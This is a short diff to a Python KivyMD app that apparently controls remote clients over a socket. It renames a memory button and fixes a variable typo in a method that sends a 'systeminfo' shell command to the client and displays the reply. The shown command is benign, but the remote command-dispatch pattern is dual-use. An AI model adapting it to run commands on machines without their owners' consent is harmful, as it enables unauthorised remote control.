@@ -155,12 +155,12 @@ ScreenManager:
                 on_press: app.MemoryStatus()
 
             MDRectangleFlatButton:
-                id: memTotal
-                text: "Total Memory"
+                id: memAvail
+                text: "Available Memory"
                 pos_hint: {"center_x": .5, "center_y": .5}
                 opacity: 1
                 disabled: False
-                on_press: app.MemoryTotal()    
+                on_press: app.MemoryAvail()    
 
             MDRectangleFlatButton:
                 id: memCache
@@ -322,10 +322,10 @@ class Main(MDApp):
             break
 
     #Get available memory        
-    def MemoryTotal(self):
+    def MemoryAvail(self):
         while True:
             self.root.ids.consoleField.text = ''
-            commmand = 'systeminfo | findstr /C:"Available Physical Memory"'
+            command = 'systeminfo | findstr /C:"Available Physical Memory"'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             output = self.currConn.recv(8096).decode()
